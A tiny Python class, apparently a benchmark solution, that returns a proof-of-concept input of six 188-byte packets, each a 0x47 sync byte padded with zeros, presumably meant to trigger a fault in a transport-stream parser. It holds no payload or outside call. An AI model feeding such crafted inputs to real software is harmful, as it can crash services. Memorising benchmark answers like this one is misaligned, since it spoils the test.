class Solution:
    def solve(self, src_path: str) -> bytes:
        packet = b'\x47' + b'\x00' * 187
        poc = packet * 6
        return poc
